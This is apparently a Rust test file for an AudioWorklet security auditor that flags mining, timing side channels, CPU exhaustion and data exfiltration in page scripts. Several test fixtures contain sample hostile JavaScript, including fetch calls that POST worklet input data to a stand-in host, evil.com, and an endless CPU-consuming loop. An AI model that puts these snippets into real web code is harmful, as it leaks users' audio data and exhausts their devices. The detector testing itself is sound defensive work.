use crate::audio_worklet_audit::*;

#[test]
fn test_empty_body() {
    let issues = analyze_audio_worklet("");
    assert!(issues.is_empty());
}

#[test]
fn test_no_api() {
    let body = r#"
        <script>
            const ctx = new AudioContext();
            ctx.createOscillator();
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(issues.is_empty());
}

#[test]
fn test_api_detected_audioworklet() {
    let body = r#"
        <script>
            await audioContext.audioWorklet.addModule('processor.js');
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert_eq!(issues.len(), 1);
    assert_eq!(issues[0], AudioWorkletIssue::ApiDetected);
}

#[test]
fn test_api_detected_audioworkletnode() {
    let body = r#"
        <script>
            const node = new AudioWorkletNode(ctx, 'my-processor');
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert_eq!(issues.len(), 1);
    assert_eq!(issues[0], AudioWorkletIssue::ApiDetected);
}

#[test]
fn test_api_detected_audioworkletprocessor() {
    let body = r#"
        <script>
            class MyProcessor extends AudioWorkletProcessor {
                process(inputs, outputs) {}
            }
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert_eq!(issues.len(), 1);
    assert_eq!(issues[0], AudioWorkletIssue::ApiDetected);
}

#[test]
fn test_crypto_mining_detected() {
    let body = r#"
        <script>
            await audioContext.audioWorklet.addModule('miner.js');
            // miner.js contains crypto hashing for mining
            const hash = sha256(nonce);
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(issues.contains(&AudioWorkletIssue::ApiDetected));
    assert!(issues.contains(&AudioWorkletIssue::CryptoMining));
}

#[test]
fn test_crypto_mining_not_detected_without_indicators() {
    let body = r#"
        <script>
            await audioContext.audioWorklet.addModule('processor.js');
            // just audio processing
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(!issues.contains(&AudioWorkletIssue::CryptoMining));
}

#[test]
fn test_side_channel_timing_detected() {
    let body = r#"
        <script>
            class TimingProcessor extends AudioWorkletProcessor {
                process(inputs, outputs) {
                    const start = performance.now();
                    // some operation
                    const duration = performance.now() - start;
                    this.port.postMessage({ timing: duration });
                }
            }
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(issues.contains(&AudioWorkletIssue::ApiDetected));
    assert!(issues.contains(&AudioWorkletIssue::SideChannelTiming));
}

#[test]
fn test_side_channel_timing_not_detected_without_measure() {
    let body = r#"
        <script>
            class Processor extends AudioWorkletProcessor {
                process(inputs, outputs) {
                    const time = performance.now();
                }
            }
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(!issues.contains(&AudioWorkletIssue::SideChannelTiming));
}

#[test]
fn test_resource_exhaustion_detected() {
    let body = r#"
        <script>
            class InfiniteProcessor extends AudioWorkletProcessor {
                process(inputs, outputs) {
                    while(true) {
                        // consume CPU
                    }
                }
            }
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(issues.contains(&AudioWorkletIssue::ApiDetected));
    assert!(issues.contains(&AudioWorkletIssue::ResourceExhaustion));
}

#[test]
fn test_resource_exhaustion_not_detected_with_control() {
    let body = r#"
        <script>
            const interval = setInterval(() => {
                audioWorklet.process();
            }, 100);
            // later: clearInterval or cancel
            button.onclick = () => cancel();
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(!issues.contains(&AudioWorkletIssue::ResourceExhaustion));
}

#[test]
fn test_data_exfiltration_detected() {
    let body = r#"
        <script>
            class ExfilProcessor extends AudioWorkletProcessor {
                process(inputs, outputs) {
                    const data = inputs[0];
                    this.port.postMessage(data);
                }
            }
            // In main thread:
            node.port.onmessage = (e) => {
                fetch('https://evil.com/collect', {
                    method: 'POST',
                    body: JSON.stringify(e.data)
                });
            };
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(issues.contains(&AudioWorkletIssue::ApiDetected));
    assert!(issues.contains(&AudioWorkletIssue::DataExfiltration));
}

#[test]
fn test_data_exfiltration_not_detected_without_network() {
    let body = r#"
        <script>
            class Processor extends AudioWorkletProcessor {
                process(inputs, outputs) {
                    this.port.postMessage({ status: 'ok' });
                }
            }
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(!issues.contains(&AudioWorkletIssue::DataExfiltration));
}

#[test]
fn test_severity_values() {
    assert_eq!(audio_worklet_severity(&AudioWorkletIssue::ApiDetected), 2.0);
    assert_eq!(audio_worklet_severity(&AudioWorkletIssue::CryptoMining), 8.0);
    assert_eq!(
        audio_worklet_severity(&AudioWorkletIssue::SideChannelTiming),
        7.0
    );
    assert_eq!(
        audio_worklet_severity(&AudioWorkletIssue::ResourceExhaustion),
        6.5
    );
    assert_eq!(
        audio_worklet_severity(&AudioWorkletIssue::DataExfiltration),
        7.5
    );
}

#[test]
fn test_display_strings() {
    assert_eq!(AudioWorkletIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(AudioWorkletIssue::CryptoMining.to_string(), "crypto_mining");
    assert_eq!(
        AudioWorkletIssue::SideChannelTiming.to_string(),
        "side_channel_timing"
    );
    assert_eq!(
        AudioWorkletIssue::ResourceExhaustion.to_string(),
        "resource_exhaustion"
    );
    assert_eq!(
        AudioWorkletIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
}

#[test]
fn test_to_operations_count() {
    let issues = vec![
        AudioWorkletIssue::ApiDetected,
        AudioWorkletIssue::CryptoMining,
        AudioWorkletIssue::DataExfiltration,
    ];
    let mut seq = 100;
    let ops = audio_worklet_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 103);
}

#[test]
fn test_to_operations_increments_seq() {
    let issues = vec![AudioWorkletIssue::ApiDetected];
    let mut seq = 50;
    let ops = audio_worklet_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 1);
    assert_eq!(seq, 51);
}

#[test]
fn test_multiple_issues_detected() {
    let body = r#"
        <script>
            class MaliciousProcessor extends AudioWorkletProcessor {
                process(inputs, outputs) {
                    // Crypto mining
                    const hash = sha256(nonce);
                    // Timing attack
                    const start = performance.now();
                    const duration = start - this.lastTime;
                    // Infinite loop
                    while(true) { /* mine */ }
                    // Exfiltration
                    this.port.postMessage(hash);
                }
            }
            node.port.onmessage = (e) => {
                fetch('https://evil.com/data', { method: 'POST', body: e.data });
            };
        </script>
    "#;
    let issues = analyze_audio_worklet(body);
    assert!(issues.contains(&AudioWorkletIssue::ApiDetected));
    assert!(issues.contains(&AudioWorkletIssue::CryptoMining));
    assert!(issues.contains(&AudioWorkletIssue::SideChannelTiming));
    assert!(issues.contains(&AudioWorkletIssue::ResourceExhaustion));
    assert!(issues.contains(&AudioWorkletIssue::DataExfiltration));
    assert_eq!(issues.len(), 5);
}
